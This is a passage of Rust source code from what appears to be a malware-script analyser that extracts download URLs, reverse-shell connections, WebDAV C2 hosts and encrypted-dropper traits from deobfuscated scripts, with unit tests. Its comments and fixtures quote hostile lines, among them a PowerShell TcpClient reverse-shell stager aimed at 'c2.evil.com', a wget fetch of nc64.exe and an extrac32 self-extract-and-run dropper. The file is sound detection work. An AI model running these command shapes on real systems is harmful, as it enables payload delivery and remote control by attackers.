        };
        let text = text.trim();
        // The decoded text must START with http(s)/ftp/file — not just CONTAIN it
        // (since longer payloads with embedded URLs are caught by other passes)
        if !(text.starts_with("http://")
            || text.starts_with("https://")
            || text.starts_with("ftp://")
            || text.starts_with("file://"))
        {
            continue;
        }
        if text.len() > 2048 {
            continue;
        }
        if !text.as_bytes().iter().all(|b| !b.is_ascii_control()) {
            continue;
        }
        if known.contains(text) {
            continue;
        }
        let url = text.to_string();
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "quoted-b64-string".to_string(),
        });
    }
}

#[allow(clippy::expect_used)]
static TRUNC_URL_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#""=(?:https?)?://([A-Za-z0-9][A-Za-z0-9.\-]{3,}\.[A-Za-z]{2,}(?::\d+)?(?:/[^"\s]*)?)"#,
    )
    .expect("trunc url")
});

pub fn scan_truncated_url_vars(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in TRUNC_URL_RE.captures_iter(deobfuscated) {
        let Some(m) = caps.get(1) else { continue };
        let url = format!("https://{}", m.as_str());
        if known.contains(&url) {
            continue;
        }
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "trunc-url-var".to_string(),
        });
    }
}

#[allow(clippy::expect_used)]
static CERTUTIL_DECODE_RE: Lazy<Regex> = Lazy::new(|| {
    // Matches: certutil [-f] -decode  (case-insensitive). We do not require
    // the same source/target filenames; just the presence of a decode call
    // is enough to gate this sweep, paired with a preceding `echo <b64>`.
    Regex::new(r"(?i)\bcertutil(?:\.exe)?\b[^\r\n]*?-decode\b").expect("certutil decode")
});

#[allow(clippy::expect_used)]
static ECHO_B64_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures the base64 emitted via `echo <b64> >` redirection. Allows the
    // payload to contain `+`/`/`/`=` since attackers often pipe pure base64.
    // Minimum length 40 to filter out short echo statements / file paths.
    Regex::new(r#"(?im)^[^\r\n]*?\becho\s+([A-Za-z0-9+/]{40,}={0,2})\s*[1-9]?>"#).expect("echo b64")
});

#[allow(clippy::expect_used)]
static JS_BARE_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Inside a decoded JS payload, match `"//<host>/...""`-style URL tails
    // that are concatenated from earlier `"sc"+"r"+...` fragments.
    Regex::new(r#""//([A-Za-z0-9][A-Za-z0-9.\-]+\.[A-Za-z]{2,}(?:/[^"\\\s<>]*)?)""#)
        .expect("js bare url")
});

fn decoded_text_looks_like_script(text: &str) -> bool {
    contains_ascii_case_insensitive(text, "getobject")
        || contains_ascii_case_insensitive(text, "activexobject")
        || contains_ascii_case_insensitive(text, "wscript")
        || contains_ascii_case_insensitive(text, "xmlhttp")
        || contains_ascii_case_insensitive(text, "<script")
        || contains_ascii_case_insensitive(text, "eval(")
        || contains_ascii_case_insensitive(text, "function")
        || contains_ascii_case_insensitive(text, "var ")
        || contains_ascii_case_insensitive(text, "new ")
}

pub fn scan_certutil_decoded_js(deobfuscated: &str, env: &mut Environment) {
    use base64::Engine;
    // Cheap gate: only sweep when both signals are present.
    if !CERTUTIL_DECODE_RE.is_match(deobfuscated) {
        return;
    }
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in ECHO_B64_RE.captures_iter(deobfuscated) {
        let Some(b64_m) = caps.get(1) else { continue };
        let b64 = b64_m.as_str();
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
            continue;
        };
        let raw = String::from_utf8_lossy(&decoded).into_owned();
        if !decoded_text_looks_like_script(&raw) {
            continue;
        }
        // Reuse the JS post-processing pipeline so split-string concat resolves.
        let unescaped = crate::js_scan::decode_u_escapes(&raw);
        let joined = crate::js_scan::expand_js_string_concat(&unescaped);
        for url_caps in JS_BARE_URL_RE.captures_iter(&joined) {
            let Some(host_path) = url_caps.get(1) else {
                continue;
            };
            let url = format!("https://{}", host_path.as_str());
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "certutil-decode-js".to_string(),
                src: url,
                dst: None,
            });
        }
        // Also catch fully-formed http(s)/script: URLs that survived without
        // needing the split-string expansion.
        for url_caps in URL_RE.captures_iter(&joined) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_url_suffix(m.as_str());
            if url.len() < 8 {
                continue;
            }
            if is_noise_url(url) {
                continue;
            }
            if known.contains(url) {
                continue;
            }
            if !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "certutil-decode-js".to_string(),
                src: url.to_string(),
                dst: None,
            });
        }
    }
}

#[allow(clippy::expect_used)]
static ECHO_U_ESCAPE_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures a run of >=4 consecutive `\uXXXX` escapes appearing inside an
    // `echo` statement. Attackers drop these as `echo eval('va...');`
    // into a .js/.vbs file and then `call`/`wscript` it.
    Regex::new(r"(?i)\becho\b[^\r\n]*?((?:\\u[0-9a-fA-F]{4}){4,})").expect("echo u-escape")
});

pub fn scan_echoed_unicode_js(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in ECHO_U_ESCAPE_RE.captures_iter(deobfuscated) {
        let Some(esc) = caps.get(1) else { continue };
        let decoded = crate::js_scan::decode_u_escapes(esc.as_str());
        let joined = crate::js_scan::expand_js_string_concat(&decoded);
        for url_caps in JS_BARE_URL_RE.captures_iter(&joined) {
            let Some(host_path) = url_caps.get(1) else {
                continue;
            };
            let url = format!("https://{}", host_path.as_str());
            if known.contains(&url) {
                continue;
            }
            if !seen.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "echo-unicode-js".to_string(),
                src: url,
                dst: None,
            });
        }
        for url_caps in URL_RE.captures_iter(&joined) {
            let Some(m) = url_caps.get(1) else { continue };
            let url = trim_url_suffix(m.as_str());
            if url.len() < 8 {
                continue;
            }
            if is_noise_url(url) {
                continue;
            }
            if known.contains(url) {
                continue;
            }
            if !seen.insert(url.to_string()) {
                continue;
            }
            env.traits.push(Trait::Download {
                cmd: "echo-unicode-js".to_string(),
                src: url.to_string(),
                dst: None,
            });
        }
    }
}

#[allow(clippy::expect_used)]
static HOST_LITERAL_RE: Lazy<Regex> = Lazy::new(|| {
    // Hostname shape only. No left-anchored `\b` because the host is often
    // glued to an uppercase marker (both word chars, so `\b` would fail).
    // We disambiguate via the marker-twice check below. The trailing class
    // anchors on a non-host char ([a-z]{2,} run ended) so we don't bleed
    // into a following uppercase marker.
    Regex::new(r"[a-z0-9][a-z0-9.\-]{2,}\.[a-z]{2,}").expect("host literal")
});

#[allow(clippy::expect_used)]
static QUERY_DIGIT_RE: Lazy<Regex> = Lazy::new(|| Regex::new(r"^\?\d+").expect("query digit"));

fn is_marker_char(b: u8, first: bool) -> bool {
    if first {
        b.is_ascii_uppercase()
    } else {
        b.is_ascii_uppercase() || b.is_ascii_digit()
    }
}

// Catches the mshta/HTA dropper family that hides the host inside a
// repeated 1-7-char marker, e.g.
//   `set 9IF=BOTKRBOTKRa9eikr.5wyck43a9uxnu7e.cfdBOTKR?1BOTKR`
// After the runtime strips the marker, the URL is `host?N`. We find host
// candidates with a plain regex, then inspect adjacent bytes for a marker
// that occurs at least twice immediately before the host and once between
// host and a `?N` query suffix.
pub fn scan_delim_wrapped_urls(deobfuscated: &str, env: &mut Environment) {
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let bytes = deobfuscated.as_bytes();
    for h in HOST_LITERAL_RE.find_iter(deobfuscated) {
        // Try marker lengths 1..=7; require the marker to appear *twice*
        // immediately before the host start (`MM<host>`) and at least once
        // immediately after, followed by `?<digits>`.
        for len in 1..=7usize {
            if h.start() < 2 * len {
                continue;
            }
            let m1_start = h.start() - len;
            let m2_start = h.start() - 2 * len;
            let m1 = &bytes[m1_start..h.start()];
            let m2 = &bytes[m2_start..m1_start];
            if m1 != m2 {
                continue;
            }
            if !m1
                .iter()
                .enumerate()
                .all(|(i, &b)| is_marker_char(b, i == 0))
            {
                continue;
            }
            // After host: <marker><query><marker?>
            let after = &bytes[h.end()..];
            if after.len() < len {
                continue;
            }
            if &after[..len] != m1 {
                continue;
            }
            // Find query past the marker
            let post = match std::str::from_utf8(&after[len..]) {
                Ok(s) => s,
                Err(_) => continue,
            };
            let q = match QUERY_DIGIT_RE.find(post) {
                Some(q) => q,
                None => continue,
            };
            let url = format!("https://{}{}", h.as_str(), q.as_str());
            if is_noise_url(&url) {
                break;
            }
            if known.contains(&url) {
                break;
            }
            if !seen.insert(url.clone()) {
                break;
            }
            env.traits.push(Trait::Download {
                cmd: "delim-wrapped-mshta-hta".to_string(),
                src: url,
                dst: None,
            });
            break;
        }
    }
}

#[allow(clippy::expect_used)]
static BARE_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // Captures schemeless IP+path URLs passed to a download verb:
    //   curl -uri 185.117.72.132/gate990.php
    //   wget 91.92.34.126:6600
    // Limited to obvious download-verb contexts to avoid matching IPs that
    // appear as logging/whitelist values.
    Regex::new(
        // download verbs: schemeless IP[:port]/path
        // -connect / connectto: VNC + tightvnc reverse-connect to IP:port
        r#"(?i)(?:\bcurl\b|\bwget\b|\biwr\b|\birm\b|\bInvoke-(?:WebRequest|RestMethod)\b|-uri|-connect|--connect|connectto)\s+["']?((?:\d{1,3}\.){3}\d{1,3}(?::\d+)?(?:/[^\s"'<>]*)?)"#,
    )
    .expect("bare ip url")
});

#[allow(clippy::expect_used)]
static REMOTE_CONNECT_RE: Lazy<Regex> = Lazy::new(|| {
    Regex::new(
        r#"(?i)\bwinvnc(?:\.exe)?\b[^\r\n]*\s-connect\s+(\d{1,3}(?:\.\d{1,3}){3}):(\d{1,5})"#,
    )
    .expect("remote connect regex")
});

#[allow(clippy::expect_used)]
static PS_TCP_CLIENT_RE: Lazy<Regex> = Lazy::new(|| {
    // PowerShell reverse shell / Empire / Posh stager pattern:
    //   $c = New-Object Net.Sockets.TcpClient('10.0.0.5', 4444)
    //   $c = New-Object System.Net.Sockets.TcpClient -ArgumentList '10.0.0.5',4444
    //   $client = New-Object Net.Sockets.TCPClient("c2.evil.com", 8080)
    // Captures host (IP or hostname) and port. The PS form is
    // case-insensitive and the constructor args can be positional or
    // `-ArgumentList`-flagged.
    Regex::new(
        r#"(?ix)
            New-Object \s+ (?:System\.)? Net\.Sockets\.TcpClient
            \s* (?: -ArgumentList \s+ | \( \s* )
            ['"]?
            ( (?:\d{1,3}(?:\.\d{1,3}){3}) | (?:[a-z0-9\-]+(?:\.[a-z0-9\-]+){1,5}) )
            ['"]?
            \s* , \s*
            (\d{1,5})
        "#,
    )
    .expect("ps tcp client regex")
});

#[allow(clippy::expect_used)]
static DECIMAL_IP_URL_RE: Lazy<Regex> = Lazy::new(|| {
    // PowerShell accepts a 32-bit integer in place of an IPv4 host:
    //   Invoke-WebRequest 1297338337/x.jpg  ->  http://77.83.42.33/x.jpg
    // The decimal form has to be ≥ 8 digits (smallest dotted IP encoded this
    // way is `1.0.0.0` = 16777216) and < 11 digits (max 32-bit = 4294967295).
    //
    // (?m) so `^` matches at every line start. The verb anchor requires a
    // command-position context (line start, whitespace, or a CMD/PS
    // separator) — `\b` alone matched prose like `# curl request id …` and
    // emitted phantom IOCs. Path char class excludes `;` so
    // `iwr 1297338337/x.jpg;Stop-Process` stops at the statement separator
    // rather than swallowing it. Trailing 11+-digit truncation (regex
    // consuming the first 10 digits of `12345678901`) is rejected in the
    // scan_decimal_ip_urls validator below — Rust's regex crate doesn't
    // support lookahead.
    Regex::new(
        r#"(?im)(?:^|[\s;&|(])(?:curl|wget|iwr|irm|Invoke-WebRequest|Invoke-RestMethod|-uri|DownloadString|DownloadFile|DownloadData)\s*\(?\s*["']?(\d{8,10})(/[^\s"'<>);]*)?"#,
    )
    .expect("decimal ip url regex")
});

fn decimal_to_ipv4(n: u32) -> String {
    format!(
        "{}.{}.{}.{}",
        (n >> 24) & 0xff,
        (n >> 16) & 0xff,
        (n >> 8) & 0xff,
        n & 0xff,
    )
}

pub fn scan_decimal_ip_urls(deobfuscated: &str, env: &mut Environment) {
    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            Trait::DownloadInDeobText { src, .. } => Some(src.clone()),
            // Also include RemoteConnect's synthesized URL so we don't
            // double-emit the same host:port via two different trait
            // variants (the global semantic_dedup_key treats them as
            // separate keys).
            Trait::RemoteConnect { host, port, .. } => Some(format!("http://{host}:{port}")),
            _ => None,
        })
        .collect::<std::collections::HashSet<String>>();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    let bytes = deobfuscated.as_bytes();
    for caps in DECIMAL_IP_URL_RE.captures_iter(deobfuscated) {
        let Some(dec) = caps.get(1) else { continue };
        // Reject truncated matches: if the digit-run capture ended at a
        // position whose next byte is also a digit, the actual integer
        // had more than 10 digits — refuse the partial. Rust's regex
        // crate doesn't support lookahead so we check explicitly here.
        let end = dec.end();
        if bytes.get(end).is_some_and(|b| b.is_ascii_digit()) {
            continue;
        }
        let Ok(n) = dec.as_str().parse::<u32>() else {
            continue;
        };
        // Reject obvious non-IP integers: lowest octet 0, host octet 0 in
        // the leading position (decimals < 16777216 are < 8 digits anyway).
        let high = (n >> 24) & 0xff;
        if high == 0 {
            continue;
        }
        let ip = decimal_to_ipv4(n);
        let path = caps.get(2).map(|m| m.as_str()).unwrap_or("");
        let url = format!("http://{}{}", ip, path);
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) || !seen.insert(url.clone()) {
            continue;
        }
        known.insert(url.clone());
        env.traits.push(Trait::Download {
            cmd: "decimal-ip-url".to_string(),
            src: url,
            dst: None,
        });
    }
}

pub fn scan_bare_ip_urls(deobfuscated: &str, env: &mut Environment) {
    scan_remote_connects(deobfuscated, env);
    let known = env.known_extracted_urls();
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in BARE_IP_URL_RE.captures_iter(deobfuscated) {
        let Some(ip_path) = caps.get(1) else { continue };
        let url = format!("http://{}", ip_path.as_str());
        if is_noise_url(&url) {
            continue;
        }
        if known.contains(&url) {
            continue;
        }
        if !seen.insert(url.clone()) {
            continue;
        }
        env.traits.push(Trait::DownloadInDeobText {
            src: url,
            line_hint: "bare-ip-url".to_string(),
        });
    }
}

pub(crate) fn wget_command_matches_ci(cmd: &str) -> bool {
    let Some(base) = basename_trimmed(cmd) else {
        return false;
    };
    base.eq_ignore_ascii_case("wget")
        || base.eq_ignore_ascii_case("wget.exe")
        || base.eq_ignore_ascii_case("get.exe")
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod wget_prefilter_tests {
    use super::{parse_wget_like_download, wget_command_matches_ci, wget_flag_matches_ci};
    use crate::handlers::util::split_words;

    #[test]
    fn mixed_case_output_document_token_is_parsed() {
        let tokens = split_words(
            r#"WiGeT --no-check-certificate http://%%B/win/nc64.exe --OuTpUt-DoCuMeNt=C:\WINDOWS\nc64.exe"#,
        );
        assert_eq!(
            parse_wget_like_download(&tokens),
            Some((
                "http://%%B/win/nc64.exe".to_string(),
                Some("C:\\WINDOWS\\nc64.exe".to_string())
            ))
        );
    }

    #[test]
    fn wget_short_flags_match_case_insensitively() {
        assert!(wget_flag_matches_ci("-O", "-o"));
        assert!(wget_flag_matches_ci("-P", "-p"));
        assert!(wget_flag_matches_ci("-i", "-I"));
        assert!(!wget_flag_matches_ci("--output", "-o"));
    }

    #[test]
    fn wget_command_name_matches_case_insensitively() {
        assert!(wget_command_matches_ci(r#"WgEt.EXE"#));
        assert!(wget_command_matches_ci(r#"C:\Temp\get.EXE"#));
        assert!(!wget_command_matches_ci("curl.exe"));
    }
}

fn scan_remote_connects(deobfuscated: &str, env: &mut Environment) {
    let mut seen: std::collections::HashSet<(String, u16)> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::RemoteConnect { host, port, .. } => Some((host.clone(), *port)),
            _ => None,
        })
        .collect();
    for line in deobfuscated.lines() {
        for caps in REMOTE_CONNECT_RE.captures_iter(line) {
            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                continue;
            };
            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
        // PowerShell `New-Object Net.Sockets.TcpClient('host', port)` —
        // canonical reverse shell / Posh-stager / Empire C2 pattern.
        // 29 corpus samples use this; flagging adds a high-signal
        // RemoteConnect IOC even when the URL form never surfaces.
        for caps in PS_TCP_CLIENT_RE.captures_iter(line) {
            let Some(host) = caps.get(1).map(|m| m.as_str().to_string()) else {
                continue;
            };
            let Some(port) = caps.get(2).and_then(|m| m.as_str().parse::<u16>().ok()) else {
                continue;
            };
            if !seen.insert((host.clone(), port)) {
                continue;
            }
            env.traits.push(Trait::RemoteConnect {
                cmd: line.to_string(),
                host,
                port,
            });
        }
    }
}

#[allow(clippy::expect_used)]
static STAGE1_REPLACE_RE: Lazy<Regex> = Lazy::new(|| {
    // Single-quoted long string immediately followed by .Replace('marker','')
    // The b64-with-marker can run to 30 KB. PS single-quoted strings cannot
    // contain literal single quotes (those are escaped as `''`), so a non-`'`
    // character class is safe.
    // Unbounded upper limit; Rust's regex DFA size is exponential in the
    // explicit upper bound, and `{200,30000}` compiles past the 10 MB cap.
    Regex::new(r"'([^']{200,})'\s*\.\s*Replace\s*\(\s*'([^']{2,40})'\s*,\s*''\s*\)")
        .expect("stage1 replace")
});

/// Detect the multi-stage AES-CBC dropper family that appears in ~70 corpus
/// samples (DHL_Delivery_Form, factura_*, etc.). The terminal payload sits
/// behind:
///   stage-1 b64 + .Replace(marker, '') -> UTF-16LE PowerShell
///   stage-2 PS reads `:::N*` lines from a copy of the .bat
///   stage-3 PS contains AES key/IV + reads single `:: ` line, AES-CBC
///   decrypts both halves, gzip-decompresses, reflection-loads a .NET assembly
/// We can't reach the URL without implementing the full AES chain, but we
/// can flag the sample as a multi-stage encrypted dropper so an analyst
/// knows to expect a static-blind dead end and look at the assembly bytes.
pub fn scan_multistage_encrypted_dropper(deobfuscated: &str, env: &mut Environment) {
    let already_present = env
        .traits
        .iter()
        .any(|t| matches!(t, Trait::MultiStageEncryptedDropper { .. }));
    if already_present {
        return;
    }
    let Some(caps) = STAGE1_REPLACE_RE.captures(deobfuscated) else {
        return;
    };
    let Some(b64) = caps.get(1) else { return };
    let Some(marker) = caps.get(2) else { return };
    if b64.as_str().len() < 1000 {
        // Skip the short variants — these are typically nested fragments
        // emitted by the obfuscator that don't lead anywhere useful, while
        // the real dropper carries a >>1 KB stage-1 blob.
        return;
    }
    // .NET/PS type names are case-INSENSITIVE in PowerShell — `aes]::create`
    // works as well as `Aes]::Create`. Obfuscators sometimes flip case
    // (especially in extracted PS bodies) so check on a lowercased copy.
    let has_aes_cbc = contains_ascii_case_insensitive(deobfuscated, "cryptography.aes")
        || contains_ascii_case_insensitive(deobfuscated, "ciphermode]::cbc")
        || contains_ascii_case_insensitive(deobfuscated, "aes]::create");
    let has_gzip_stage = contains_ascii_case_insensitive(deobfuscated, "gzipstream")
        || contains_ascii_case_insensitive(deobfuscated, "compression.compressionmode")
        || deobfuscated.contains("H4sIA"); // gzip magic = case-sensitive b64
    let reads_self_lines = deobfuscated.contains(":::") || deobfuscated.contains(":: ");
    env.traits.push(Trait::MultiStageEncryptedDropper {
        marker: marker.as_str().to_string(),
        b64_length: u32::try_from(b64.as_str().len()).unwrap_or(u32::MAX),
        has_aes_cbc,
        has_gzip_stage,
        reads_self_lines,
        aes_key_b64: None,
        aes_iv_b64: None,
        assemblies_recovered: None,
        nested_aes: Vec::new(),
    });
}

/// Translate the WebDAV UNC form into the http(s):// URL Windows itself
/// resolves it to. Rules:
///   `\\host@port\share\...path...`     -> `http://host:port/...path...`
///   `\\host@SSL@port\share\...path...` -> `https://host:port/...path...`
///   `\\host@SSL\share\...path...`      -> `https://host/...path...`
/// where `share` == `davwwwroot` (any case) is the WebDAV virtual root and
/// is dropped; any other share becomes the first path segment.
pub fn unc_webdav_to_http_url(host: &str, port: &str, share_path: &str) -> String {
    let scheme = if port.eq_ignore_ascii_case("SSL") {
        "https"
    } else {
        "http"
    };
    let port_part = if port.eq_ignore_ascii_case("SSL") || port == "443" || port == "80" {
        String::new()
    } else {
        format!(":{port}")
    };
    // share_path looks like `\\host@port\seg1\seg2\...`. After splitting on
    // `\` and dropping empty segments, parts[0] is `host@port`, parts[1] is
    // the share name, parts[2..] is the path.
    let parts: Vec<&str> = share_path.split('\\').filter(|s| !s.is_empty()).collect();
    let path = if parts.len() >= 2 {
        let share = parts[1];
        let rest: Vec<&str> = if share.eq_ignore_ascii_case("davwwwroot") {
            parts.into_iter().skip(2).collect()
        } else {
            parts.into_iter().skip(1).collect()
        };
        rest.join("/")
    } else {
        String::new()
    };
    if path.is_empty() {
        format!("{scheme}://{host}{port_part}")
    } else {
        format!("{scheme}://{host}{port_part}/{path}")
    }
}

pub fn scan_unc_webdav(deobfuscated: &str, env: &mut Environment) {
    // Dedup by (host, port) — same WebDAV server on the same port is one C2 regardless
    // of which share path or file within it was accessed.
    let mut seen: std::collections::HashSet<(String, String)> = std::collections::HashSet::new();
    for caps in UNC_WEBDAV_RE.captures_iter(deobfuscated) {
        let host = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let port = caps
            .get(2)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if !seen.insert((host.clone(), port.clone())) {
            continue;
        }

        // Find the containing line for the command field
        let full_match = caps.get(0).map(|m| m.as_str()).unwrap_or("");
        let command = deobfuscated
            .lines()
            .find(|l| l.contains(full_match))
            .map(|l| snippet_prefix(l, 240))
            .unwrap_or_default();

        let http_url = unc_webdav_to_http_url(&host, &port, full_match);
        env.traits.push(Trait::UncWebDavC2 {
            host,
            port,
            share_path: full_match.to_string(),
            command,
            http_url,
        });
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod noise_ip_tests {
    use super::is_noise_ip;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    #[test]
    fn rfc1918_filtered() {
        assert!(is_noise_ip("http://10.0.0.5/x"));
        assert!(is_noise_ip("http://192.168.1.1/x"));
        assert!(is_noise_ip("http://172.16.0.1/x"));
        assert!(is_noise_ip("http://172.31.255.255/x"));
    }
    #[test]
    fn loopback_and_link_local_filtered() {
        assert!(is_noise_ip("http://127.0.0.1/x"));
        assert!(is_noise_ip("http://169.254.1.1/x"));
    }
    #[test]
    fn multicast_and_reserved_filtered() {
        assert!(is_noise_ip("http://224.0.0.1/x"));
        assert!(is_noise_ip("http://255.255.255.255/x"));
    }
    #[test]
    fn public_ips_not_filtered() {
        assert!(!is_noise_ip("http://8.8.8.8/x"));
        assert!(!is_noise_ip("http://1.1.1.1/x"));
        assert!(!is_noise_ip("http://45.9.74.36:8888/x.dll"));
        assert!(!is_noise_ip("http://185.117.72.132/gate990.php"));
    }
    #[test]
    fn non_ip_url_not_filtered_as_ip() {
        assert!(!is_noise_ip("http://example.com/x"));
        assert!(!is_noise_ip("not even a url"));
    }
    #[test]
    fn rfc1918_boundary_172_15_not_private() {
        // 172.15.x.x is PUBLIC (private range starts at 172.16).
        assert!(!is_noise_ip("http://172.15.0.1/x"));
        // 172.32.x.x is PUBLIC.
        assert!(!is_noise_ip("http://172.32.0.1/x"));
    }

    #[test]
    fn mixed_case_scheme_still_filters_private_ips() {
        assert!(is_noise_ip("HtTp://10.0.0.5/x"));
    }

    #[test]
    fn mixed_case_localhost_is_noise_url() {
        assert!(super::is_noise_url("HtTp://LOCALHOST/x"));
    }

    #[test]
    fn github_static_assets_are_noise_but_raw_repo_urls_are_not() {
        assert!(super::is_noise_url(
            "hTtPs://GiThUb.GiThUbAsSeTs.CoM/aSSeTs/light.css"
        ));
        assert!(super::is_noise_url("HtTpS://GiThUb.GiThUbAsSeTs.CoM"));
        assert!(super::is_noise_url(
            "hTtPs://AvAtArS.gItHuBuSeRcOnTeNt.CoM/u/123?v=4"
        ));
        assert!(super::is_noise_url("HtTpS://GiThUb.CoM/FeAtUrEs/actions"));
        assert!(!super::is_noise_url(
            "https://github.com/acme/dropper/raw/refs/heads/main/payload.bat"
        ));
    }

    #[test]
    fn certificate_metadata_urls_are_noise() {
        assert!(super::is_noise_url("hTtP://wWw.MiCrOsOfT.CoM/ExPoRtInG"));
        assert!(super::is_noise_url(
            "http://www.microsoft.com/pki/certs/MicrosoftTimeStampPCA.crt0"
        ));
        assert!(super::is_noise_url("HtTp://wWw.SySiNtErNaLs.CoM"));
        assert!(super::is_noise_url("hTtPs://wWw.VeRiSiGn.CoM/RpA"));
        assert!(super::is_noise_url("http://logo.verisign.com/vslogo.gif"));
        assert!(super::is_noise_url("http://ts-ocsp.ws.symantec.com"));
        assert!(super::is_noise_url("hTtPs://D.SyMcB.CoM/cPs"));
    }

    #[test]
    fn xmp_and_stock_metadata_urls_are_noise() {
        assert!(super::is_noise_url(
            "hTtP://iPtC.OrG/StD/Iptc4xmpCore/1.0/xmlns/"
        ));
        assert!(super::is_noise_url("hTtP://XmP.GeTtYiMaGeS.CoM/GiFt/1.0/"));
        assert!(super::is_noise_url("HtTp://Ns.UsePlUs.OrG/lDf/xMp/1.0/"));
        assert!(super::is_noise_url(
            "https://www.istockphoto.com/photo/license-gm1721592530-"
        ));
        assert!(super::is_noise_url(
            "http://www.apache.org/licenses/LICENSE-2.0\\par"
        ));
        assert!(super::is_noise_url(
            "http://www.red-gate.com/products/dotnet-development/smartassembly/?utm_source=x"
        ));
        assert!(super::is_noise_url("http://sawebservice.red-gate.com/"));
    }

    #[test]
    fn malformed_binary_urls_are_noise() {
        assert!(super::is_noise_url(
            "http://ts-ocsp.ws.symantec.com07\u{6}\u{8}"
        ));
        assert!(super::is_noise_url("http://example.com/path\u{fffd}tail"));
    }

    #[test]
    fn mixed_case_ransom_extension_is_canonicalized() {
        let mut env = Environment::new(&Config::default());
        super::scan_ransom_ext("report.EnCrYpTeD", &mut env);
        assert!(env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::RansomFileExtension { extension }
                    if extension == ".encrypted"
            )
        }));
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod ps_var_socket_connect_tests {
    use super::scan_ps_var_socket_connect;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn connects(script: &str) -> Vec<(String, u16)> {
        let mut env = Environment::new(&Config::default());
        scan_ps_var_socket_connect(script, &mut env);
        env.traits
            .into_iter()
            .filter_map(|t| match t {
                Trait::RemoteConnect { host, port, .. } => Some((host, port)),
                _ => None,
            })
            .collect()
    }

    #[test]
    fn ip_and_port_vars_with_tcpclient_emit_remoteconnect() {
        // b087e1309f3eab63… corpus shape — top-of-script IP + port
        // literals, TcpClient further down with variable args.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $dport = 443
            $rc4 = New-Object byte[] 256
            $client = New-Object System.Net.Sockets.TcpClient($ip, $newport)
        "#;
        assert_eq!(connects(s), vec![("85.239.61.60".to_string(), 443)]);
    }

    #[test]
    fn private_ip_not_emitted() {
        // RFC1918 / loopback shouldn't fire — not real C2.
        let s = r#"
            $ipaddress = '192.168.1.100'
            $dport = 8080
            New-Object Net.Sockets.TcpClient($ip, $port)
        "#;
        assert!(connects(s).is_empty());
    }

    #[test]
    fn no_socket_use_no_emit() {
        // IP + port literals without any socket/network primitive
        // shouldn't fire — could be a config var unrelated to C2.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $dport = 443
            Write-Host "config loaded"
        "#;
        assert!(connects(s).is_empty());
    }

    #[test]
    fn power_of_two_port_lookalikes_skipped() {
        // 256/1024/2048/4096 are usually buffer sizes, not C2 ports.
        // When the only port-named var is a power-of-2, we skip the
        // pair rather than emitting a false-positive.
        let s = r#"
            $ipaddress = '85.239.61.60'
            $newport = 256
            New-Object Net.Sockets.TcpClient($ip, $port)
        "#;
        assert!(connects(s).is_empty());
    }
}

#[cfg(test)]
#[allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
mod extrac32_self_extract_tests {
    use super::scan_extrac32_self_extract;
    use crate::env::Environment;
    use crate::traits::Trait;
    use crate::Config;

    fn traits_of(script: &str) -> Vec<Trait> {
        let mut env = Environment::new(&Config::default());
        scan_extrac32_self_extract(script, &mut env);
        env.traits
    }

    #[test]
    fn bat_cab_dual_detonation_self_reference_detected() {
        // PO#5_tower_Dec162024.cmd corpus shape — bat/CAB polyglot
        // whose batch payload (hidden inside the CAB header) is
        // `extrac32 /y "%~f0" "%tmp%\x.exe" && start "" …`.
        let line = r#"cls && extrac32 /y "%~f0" "%tmp%\x.exe" && start "" "%tmp%\x.exe""#;
        let ts = traits_of(line);
        let has_extrac32 = ts.iter().any(|t| {
            matches!(
                t,
                Trait::Extrac32 { src, dst, self_reference }
                    if src == "%~f0" && dst == "%tmp%\\x.exe" && *self_reference
            )
        });
        assert!(has_extrac32, "no Extrac32 trait: {:?}", ts);
        let has_self_extract = ts.iter().any(|t| {
            matches!(
